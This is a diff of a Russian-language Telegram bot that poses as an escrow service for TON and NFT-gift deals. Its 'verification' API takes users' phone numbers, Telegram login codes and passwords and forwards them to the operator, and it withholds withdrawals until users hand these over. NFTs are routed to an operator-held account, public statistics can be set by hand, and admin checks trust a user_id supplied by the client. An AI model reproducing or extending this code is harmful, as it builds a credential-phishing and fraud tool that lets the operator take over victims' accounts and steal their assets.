+        await message.answer("❌ Тикет не найден")
+        return
+    
+    t = tickets[ticket_id]
+    t["response"] = response
+    t["status"] = "closed"
+    t["answered_at"] = datetime.now().isoformat()
+    t["answered_by"] = message.from_user.id
+    save_json(FILES["tickets"], tickets)
+    
+    await message.answer(f"✅ Ответ отправлен на тикет #{ticket_id}")
+    
+    try:
+        await bot.send_message(
+            t["user_id"],
+            f"📩 ОТВЕТ НА ТИКЕТ #{ticket_id}\n\n"
+            f"📝 {response}\n\n"
+            f"✅ Тикет закрыт"
+        )
+    except:
+        pass
+
+@dp.message(Command("close_ticket"))
+async def close_ticket_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /close_ticket [ticket_id]")
+        return
+    
+    ticket_id = args[1]
+    
+    if ticket_id not in tickets:
+        await message.answer("❌ Тикет не найден")
+        return
+    
+    t = tickets[ticket_id]
+    t["status"] = "closed"
+    t["closed_at"] = datetime.now().isoformat()
+    t["closed_by"] = message.from_user.id
+    save_json(FILES["tickets"], tickets)
+    
+    await message.answer(f"✅ Тикет #{ticket_id} закрыт")
+    
+    try:
+        await bot.send_message(
+            t["user_id"],
+            f"🔒 ТИКЕТ #{ticket_id} ЗАКРЫТ\n\n"
+            f"Администратор закрыл ваш тикет."
+        )
+    except:
+        pass
+
+# ============================================================
+# 12. ЧАТ ПОДДЕРЖКИ
+# ============================================================
+@dp.message(Command("chat_reply"))
+async def chat_reply_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("❗️ Использование: /chat_reply [session_id] [текст ответа]")
+        return
+    
+    session_id = args[1]
+    reply_text = args[2]
+    
+    # Перезагружаем данные
+    global chat_messages
+    chat_messages = load_json(FILES["chat_messages"])
+    
+    if session_id not in chat_messages:
+        await message.answer("❌ Сессия не найдена")
+        return
+    
+    if session_id not in chat_messages:
+        chat_messages[session_id] = []
+    
+    msg = {
+        "id": "m" + str(uuid.uuid4())[:8],
+        "text": reply_text,
+        "sender": "admin",
+        "timestamp": datetime.now().isoformat(),
+        "status": "sent"
+    }
+    chat_messages[session_id].append(msg)
+    save_json(FILES["chat_messages"], chat_messages)
+    
+    await message.answer(f"✅ Ответ отправлен в сессию {session_id}")
+    
+    # Отправляем пользователю уведомление
+    try:
+        target_user_id = None
+        for m in chat_messages.get(session_id, []):
+            if m.get("sender") == "user" and m.get("user_id"):
+                target_user_id = m.get("user_id")
+                break
+        
+        if target_user_id:
+            await bot.send_message(
+                target_user_id,
+                f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
+                reply_markup=mini_app_keyboard("📱 Открыть чат", "support")
+            )
+    except Exception as e:
+        print(f"Error sending to user: {e}")
+
+# ============================================================
+# 13. ЛОГИ И СТАТИСТИКА
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_logs")
+async def admin_logs(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    logs_list = list(logs.values())[-20:]
+    if not logs_list:
+        await callback.message.edit_text("📋 ЛОГИ\n\nНет записей", reply_markup=admin_panel_keyboard())
+        return
+    text = "📋 ПОСЛЕДНИЕ ЛОГИ\n\n"
+    for log_entry in reversed(logs_list[-10:]):
+        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
+        text += f"📌 {log_entry.get('action', '')}\n"
+        data = log_entry.get('data', {})
+        text += f"📊 {json.dumps(data, ensure_ascii=False)[:80]}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_stats")
+async def admin_stats(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    total_users = len(balance)
+    total_deals = len(deals)
+    total_volume = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
+    active_deals = len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])
+    open_tickets = len([t for t in tickets.values() if t.get('status') == 'open'])
+    
+    await callback.message.edit_text(
+        f"📊 СТАТИСТИКА\n\n"
+        f"👥 Пользователей: {total_users}\n"
+        f"📊 Всего сделок: {total_deals}\n"
+        f"🔄 Активных сделок: {active_deals}\n"
+        f"💎 Объём (TON): {total_volume}\n"
+        f"✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}\n"
+        f"🎫 Открытых тикетов: {open_tickets}",
+        reply_markup=admin_panel_keyboard()
+    )
+    await callback.answer()
+
+# ============================================================
+# 14. API ДЛЯ MINI APP
+# ============================================================
+async def handle_api(request):
+    headers = {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username',
+        'Access-Control-Allow-Credentials': 'true'
+    }
+    
+    if request.method == 'OPTIONS':
+        return web.Response(headers=headers, status=200)
+    
+    if request.method == 'GET':
+        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
+    
+    try:
+        data = await request.json()
+    except:
+        data = {}
+    
+    user_id = data.get('user_id')
+    endpoint = request.path
+    
+    # ===== БАЛАНС =====
+    if endpoint == '/api/balance':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        bal = get_balance(user_id)
+        return web.json_response({'success': True, 'balance': bal}, headers=headers)
+    
+    # ===== СОЗДАНИЕ СДЕЛКИ =====
+    elif endpoint == '/api/create_deal':
+        product = data.get('product')
+        currency = data.get('currency')
+        amount = data.get('amount')
+        buyer_username = data.get('buyer_username')
+        category = data.get('category', 'other')
+        nft_link = data.get('nft_link')
+        username = data.get('username', str(user_id))
+        
+        if not all([user_id, product, currency, amount, buyer_username]):
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        deal_id = str(uuid.uuid4())[:8]
+        deals[deal_id] = {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "seller_username": username,
+            "buyer_username": buyer_username.lower(),
+            "buyer_id": None,
+            "product": product,
+            "currency": currency,
+            "amount": float(amount),
+            "category": category,
+            "nft_link": nft_link,
+            "status": "waiting_payment",
+            "created_at": datetime.now().isoformat(),
+            "paid_by_admin": None,
+            "completed_at": None,
+            "nft_transferred": False,
+            "nft_transfer_account": NFT_ESCROW_ACCOUNT if category == "nft_gift" else None
+        }
+        save_json(FILES["deals"], deals)
+        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+        
+        log_action("deal_created", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "buyer_username": buyer_username,
+            "product": product,
+            "amount": amount,
+            "currency": currency,
+            "category": category
+        })
+        
+        await log_to_master(
+            f"📦 НОВАЯ СДЕЛКА #{deal_id}\n\n"
+            f"👤 Продавец: @{username} (ID: {user_id})\n"
+            f"👤 Покупатель: @{buyer_username}\n"
+            f"📦 Товар: {product}\n"
+            f"💰 Сумма: {amount} {currency}\n"
+            f"🏷️ Категория: {category}\n"
+            f"{'🔗 NFT: ' + nft_link if nft_link else ''}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
+        return web.json_response({
+            'success': True,
+            'deal_id': deal_id,
+            'link': link,
+            'status': deals[deal_id]["status"]
+        }, headers=headers)
+    
+    # ===== СДЕЛКИ =====
+    elif endpoint == '/api/deals':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        user_deals = []
+        for d_id, d in deals.items():
+            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
+                d_copy = d.copy()
+                d_copy['deal_id'] = d_id
+                user_deals.append(d_copy)
+        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
+    
+    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
+    elif endpoint == '/api/all_deals':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        return web.json_response({'success': True, 'deals': list(deals.values())}, headers=headers)
+    
+    # ===== ПРОВЕРКА АДМИНА =====
+    elif endpoint == '/api/is_admin':
+        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
+    
+    # ===== СТАТИСТИКА =====
+    elif endpoint == '/api/stats':
+        return web.json_response({
+            'success': True,
+            'deals_today': stats.get('deals_today', len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])),
+            'users': stats.get('users', len(balance)),
+            'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
+        }, headers=headers)
+    
+    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
+    elif endpoint == '/api/has_2_deals':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        bal = get_balance(user_id)
+        partners = bal.get('deal_partners', {})
+        has_two = any(count >= 2 for count in partners.values())
+        return web.json_response({
+            'success': True,
+            'has_2_deals': has_two,
+            'total_deals': sum(partners.values())
+        }, headers=headers)
+    
+    # ===== СТАТУС ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/verification_status':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'verified': is_verified(user_id),
+            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
+        }, headers=headers)
+    
+    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/send_verification_request':
+        phone = data.get('phone')
+        username = data.get('username')
+        user_id = data.get('user_id')
+        
+        if not phone or not username or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if is_verified(user_id):
+            return web.json_response({'success': False, 'error': 'User already verified'}, headers=headers)
+        
+        request_id = str(uuid.uuid4())[:8]
+        verification_requests[request_id] = {
+            "id": request_id,
+            "user_id": user_id,
+            "username": username,
+            "phone": phone,
+            "status": "pending",
+            "created_at": datetime.now().isoformat()
+        }
+        save_json(FILES["verification_requests"], verification_requests)
+        
+        await log_to_master(
+            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ\n\n"
+            f"🆔 Заявка: #{request_id}\n"
+            f"👤 Пользователь: @{username}\n"
+            f"🆔 ID: {user_id}\n"
+            f"📞 Номер: {phone}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Для подтверждения: /verify_code {request_id} [код] [пароль]"
+        )
+        
+        return web.json_response({
+            'success': True,
+            'request_id': request_id
+        }, headers=headers)
+    
+    # ===== ПРОВЕРКА КОДА =====
+    elif endpoint == '/api/submit_verification_code':
+        code = data.get('code')
+        password = data.get('password')
+        user_id = data.get('user_id')
+        request_id = data.get('request_id')
+        
+        if not code or not user_id or not request_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if request_id not in verification_requests:
+            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
+        
+        req = verification_requests[request_id]
+        
+        if req.get("status") != "pending":
+            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
+        
+        req["code"] = code
+        req["password"] = password if password else "нет"
+        req["status"] = "completed"
+        req["completed_at"] = datetime.now().isoformat()
+        save_json(FILES["verification_requests"], verification_requests)
+        
+        complete_verification(user_id, req["phone"], code)
+        
+        await log_to_master(
+            f"✅ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА\n\n"
+            f"🆔 Заявка: #{request_id}\n"
+            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
+            f"🆔 ID: {user_id}\n"
+            f"📞 Номер: {req.get('phone')}\n"
+            f"🔑 Код: {code}\n"
+            f"🕐 Сессия активна 24 часа"
+        )
+        
+        return web.json_response({
+            'success': True,
+            'expires_at': verification_data[str(user_id)].get('expires_at')
+        }, headers=headers)
+    
+    # ===== ВЫВОД =====
+    elif endpoint == '/api/withdraw':
+        currency = data.get('currency')
+        details = data.get('details')
+        
+        if not user_id or not currency or not details:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if not is_verified(user_id):
+            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
+        
+        request_id = str(uuid.uuid4())[:8]
+        withdraw_requests[request_id] = {
+            "id": request_id,
+            "user_id": user_id,
+            "currency": currency,
+            "amount": get_balance(user_id).get(currency.lower(), 0),
+            "details": details,
+            "status": "pending",
+            "created_at": datetime.now().isoformat()
+        }
+        save_json(FILES["withdraw"], withdraw_requests)
+        
+        await log_to_master(
+            f"💳 НОВАЯ ЗАЯВКА НА ВЫВОД\n\n"
+            f"👤 Пользователь: ID: {user_id}\n"
+            f"💰 Сумма: {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
+            f"📝 Реквизиты: {details}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Для подтверждения: /confirm_withdraw {request_id}"
+        )
+        
+        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
+    
+    # ===== ЗАЯВКИ НА ВЫВОД =====
+    elif endpoint == '/api/withdraw_requests':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'requests': list(withdraw_requests.values())
+        }, headers=headers)
+    
+    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/verification_requests':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'requests': list(verification_requests.values())
+        }, headers=headers)
+    
+    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
+    elif endpoint == '/api/admin_add_balance':
+        target_user_id = data.get('target_user_id')
+        currency = data.get('currency')
+        amount = data.get('amount')
+        
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        if not target_user_id or not currency or not amount:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        add_balance(target_user_id, currency, float(amount))
+        
+        await log_to_master(
+            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
+            f"👤 Админ: ID: {user_id}\n"
+            f"👤 Пользователь: {target_user_id}\n"
+            f"💰 {amount} {currency}"
+        )
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== УСТАНОВИТЬ БАЛАНС (АДМИН) =====
+    elif endpoint == '/api/admin_set_balance':
+        target_user_id = data.get('target_user_id')
+        currency = data.get('currency')
+        amount = data.get('amount')
+        
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        if not target_user_id or not currency or amount is None:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        set_balance(target_user_id, currency, float(amount))
+        
+        await log_to_master(
+            f"✏️ АДМИН УСТАНОВИЛ БАЛАНС\n\n"
+            f"👤 Админ: ID: {user_id}\n"
+            f"👤 Пользователь: {target_user_id}\n"
+            f"💰 {amount} {currency}"
+        )
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== СПИСАТЬ БАЛАНС (АДМИН) =====
+    elif endpoint == '/api/admin_remove_balance':
+        target_user_id = data.get('target_user_id')
+        currency = data.get('currency')
+        amount = data.get('amount')
+        
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        if not target_user_id or not currency or not amount:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        bal = get_balance(target_user_id)
+        curr = currency.lower()
+        current = bal.get(curr, 0)
+        new_amount = max(0, current - float(amount))
+        bal[curr] = new_amount
+        save_json(FILES["balance"], balance)
+        
+        await log_to_master(
+            f"➖ АДМИН СПИСАЛ БАЛАНС\n\n"
+            f"👤 Админ: ID: {user_id}\n"
+            f"👤 Пользователь: {target_user_id}\n"
+            f"💰 {amount} {currency}"
+        )
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ИЗМЕНИТЬ СТАТИСТИКУ =====
+    elif endpoint == '/api/admin_set_stats':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        key = data.get('key')
+        value = data.get('value')
+        
+        if not key or value is None:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        stats[key] = value
+        save_json(FILES["stats"], stats)
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ОПЛАТА С БАЛАНСА =====
+    elif endpoint == '/api/pay_balance':
+        deal_id = data.get('deal_id')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["status"] != "waiting_payment":
+            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
+        
+        buyer_balance = get_balance(user_id)
+        curr_key = deal["currency"].lower()
+        
+        if buyer_balance.get(curr_key, 0) < deal["amount"]:
+            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
+        
+        buyer_balance[curr_key] -= deal["amount"]
+        save_json(FILES["balance"], balance)
+        deal["status"] = "paid"
+        deal["paid_by_admin"] = user_id
+        save_json(FILES["deals"], deals)
+        
+        log_action("payment_from_balance", {
+            "deal_id": deal_id,
+            "buyer_id": user_id,
+            "amount": deal["amount"],
+            "currency": deal["currency"]
+        })
+        
+        await log_to_master(
+            f"💳 ОПЛАТА С БАЛАНСА\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Покупатель: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Продавец: @{deal['seller_username']}"
+        )
+        
+        # Отправляем продавцу уведомление
+        try:
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(
+                    text="📦 Подтвердить передачу",
+                    web_app=WebAppInfo(url=MINI_APP_URL + "?page=deals")
+                )],
+                [InlineKeyboardButton(
+                    text="💬 Написать покупателю",
+                    url=f"https://t.me/{deal['buyer_username']}"
+                )],
+                [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+            ])
+            
+            await bot.send_message(
+                deal["seller_id"],
+                f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
+                f"💰 {deal['amount']} {deal['currency']}\n"
+                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n"
+                f"📦 ТОВАР: {deal['product']}\n"
+                f"{'🔗 NFT: ' + deal['nft_link'] if deal.get('nft_link') else ''}\n\n"
+                f"⚠️ ВАЖНО: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}\n\n"
+                f"⬇️ Нажмите кнопку, чтобы подтвердить передачу в Mini App ⬇️",
+                reply_markup=keyboard
+            )
+        except Exception as e:
+            print(f"Error sending to seller: {e}")
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
+    elif endpoint == '/api/seller_delivered':
+        deal_id = data.get('deal_id')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["status"] != "paid":
+            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
+        
+        if deal["seller_id"] != user_id:
+            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
+        
+        deal["status"] = "awaiting_confirmation"
+        deal["nft_transferred"] = True
+        save_json(FILES["deals"], deals)
+        
+        log_action("seller_delivered", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "nft_transferred": deal.get("nft_transferred", False)
+        })
+        
+        await log_to_master(
+            f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Продавец: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Покупатель: @{deal['buyer_username']}\n"
+            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}"
+        )
+        
+        try:
+            await bot.send_message(
+                deal["buyer_id"],
+                f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
+                f"💰 {deal['amount']} {deal['currency']}\n"
+                f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n"
+                f"📦 ТОВАР: {deal['product']}\n\n"
+                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
+    elif endpoint == '/api/buyer_confirm':
+        deal_id = data.get('deal_id')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["status"] != "awaiting_confirmation":
+            return web.json_response({'success': False, 'error': 'Deal not ready'}, headers=headers)
+        
+        if deal["buyer_id"] != user_id:
+            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
+        
+        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
+        seller_balance = get_balance(deal["seller_id"])
+        buyer = deal["buyer_username"]
+        if buyer not in seller_balance["deal_partners"]:
+            seller_balance["deal_partners"][buyer] = 0
+        seller_balance["deal_partners"][buyer] += 1
+        save_json(FILES["balance"], balance)
+        
+        deal["status"] = "completed"
+        deal["completed_at"] = datetime.now().isoformat()
+        save_json(FILES["deals"], deals)
+        
+        log_action("deal_completed", {
+            "deal_id": deal_id,
+            "buyer_id": user_id,
+            "seller_id": deal["seller_id"],
+            "amount": deal["amount"],
+            "currency": deal["currency"]
+        })
+        
+        await log_to_master(
+            f"🎉 СДЕЛКА ЗАВЕРШЕНА\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Продавец: @{deal['seller_username']} (ID: {deal['seller_id']})\n"
+            f"👤 Покупатель: @{deal['buyer_username']} (ID: {deal['buyer_id']})\n"
+            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}\n"
+            f"🕐 Время завершения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
+        try:
+            await bot.send_message(
+                deal["seller_id"],
+                f"🎉 СДЕЛКА #{deal_id} ЗАВЕРШЕНА!\n\n"
+                f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА БАЛАНС\n"
+                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}"
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
+    elif endpoint == '/api/get_rekvisits':
+        deal_id = data.get('deal_id')
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        curr_key = deal["currency"].lower()
+        
+        if curr_key in rekvisits:
+            details = rekvisits[curr_key].format(amount=deal["amount"])
+        else:
+            details = f"Оплатите {deal['amount']} {deal['currency']}\nПосле оплаты нажмите 'Я оплатил'"
+        
+        return web.json_response({'success': True, 'details': details}, headers=headers)
+    
+    # ===== ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ =====
+    elif endpoint == '/api/confirm_rekvisits_payment':
+        deal_id = data.get('deal_id')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["status"] != "waiting_payment":
+            return web.json_response({'success': False, 'error': 'Deal already processed'}, headers=headers)
+        
+        await log_to_master(
+            f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n\n"
+            f"👤 Пользователь: ID: {user_id}\n"
+            f"📦 Сделка: #{deal_id}\n"
+            f"💰 {deal['amount']} {deal['currency']}\n\n"
+            f"Для подтверждения: /pay {deal_id}"
+        )
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ПЕРЕДАЧА NFT НА ЭСКРОУ =====
+    elif endpoint == '/api/transfer_nft':
+        deal_id = data.get('deal_id')
+        target_account = data.get('target_account')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["seller_id"] != user_id:
+            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
+        
+        if deal["status"] != "paid":
+            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
+        
+        if deal.get("category") != "nft_gift":
+            return web.json_response({'success': False, 'error': 'Not an NFT deal'}, headers=headers)
+        
+        deal["nft_transferred"] = True
+        deal["nft_transfer_account"] = target_account or NFT_ESCROW_ACCOUNT
+        deal["status"] = "awaiting_confirmation"
+        save_json(FILES["deals"], deals)
+        
+        log_action("nft_transferred", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "target_account": target_account or NFT_ESCROW_ACCOUNT
+        })
+        
+        await log_to_master(
+            f"🖼️ NFT ПЕРЕДАН НА ЭСКРОУ\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Продавец: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
+            f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}"
+        )
+        
+        try:
+            await bot.send_message(
+                deal["buyer_id"],
+                f"🖼️ NFT ПЕРЕДАН НА ЭСКРОУ\n\n"
+                f"📦 Товар: {deal['product']}\n"
+                f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
+                f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n\n"
+                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ТИКЕТЫ =====
+    elif endpoint == '/api/create_ticket':
+        subject = data.get('subject')
+        message = data.get('message')
+        username = data.get('username', str(user_id))
+        
+        if not user_id or not subject or not message:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        ticket_id = str(uuid.uuid4())[:8]
+        tickets[ticket_id] = {
+            "id": ticket_id,
+            "user_id": user_id,
+            "username": username,
+            "subject": subject,
+            "message": message,
+            "status": "open",
+            "response": None,
+            "created_at": datetime.now().isoformat(),
+            "answered_at": None,
+            "answered_by": None
+        }
+        save_json(FILES["tickets"], tickets)
+        
+        log_action("ticket_created", {
+            "ticket_id": ticket_id,
+            "user_id": user_id,
+            "subject": subject
+        })
+        
+        admin_text = f"""🎫 НОВЫЙ ТИКЕТ
+
+🆔 ID: #{ticket_id}
+👤 Пользователь: @{username} (ID: {user_id})
+📝 Тема: {subject}
+💬 Сообщение:
+{message}
+
+🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📌 Для ответа используйте:
+/answer_ticket {ticket_id} [ваш ответ]"""
+        
+        await log_to_master(admin_text)
+        
+        return web.json_response({
+            'success': True,
+            'ticket_id': ticket_id
+        }, headers=headers)
+    
+    elif endpoint == '/api/tickets':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        
+        user_tickets = []
+        for t_id, t in tickets.items():
+            if t.get('user_id') == user_id:
+                t_copy = t.copy()
+                t_copy['ticket_id'] = t_id
+                user_tickets.append(t_copy)
+        
+        return web.json_response({
+            'success': True,
+            'tickets': user_tickets
+        }, headers=headers)
+    
+    elif endpoint == '/api/admin_tickets':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        return web.json_response({
+            'success': True,
+            'tickets': list(tickets.values())
+        }, headers=headers)
+    
+    elif endpoint == '/api/admin_answer_ticket':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        ticket_id = data.get('ticket_id')
+        response = data.get('response')
+        
+        if not ticket_id or not response:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if ticket_id not in tickets:
